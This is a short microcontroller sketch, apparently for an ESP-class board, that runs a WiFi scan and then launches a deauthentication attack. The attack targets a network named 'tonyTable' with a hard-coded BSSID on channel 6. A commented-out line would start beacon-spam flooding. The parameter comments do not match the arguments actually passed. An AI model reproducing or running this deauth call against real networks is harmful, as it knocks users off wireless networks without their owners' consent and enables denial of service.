#include "WiFiTools.h"

WiFiTools wifiTools;

void setup() {
    Serial.begin(115200);
    delay(100);

    // Call the rickRollBeaconSpam function
    // wifiTools.rickRollBeaconSpam();

    // Call the scanWiFiNetworks function
    wifiTools.scanWiFiNetworks();

    // Call the deauthNetwork function with the following parameters:
    // uint8_t* networkSSID = tonyTable
    // uint8_t* networkBSSID = B8:27:EB:33:A2:4E
    // uint8_t channel = 6
    // int numPackets = 10
    // int delayMs = 100
    // uint8_t reasonCode = 2
    wifiTools.deauthNetwork((uint8_t*)"tonyTable", (uint8_t*)"\xB8\x27\xEB\x33\xA2\x4E", 6, -1, NULL, 1000, 1, 2);
}

void loop() {
    // Nothing to do here
}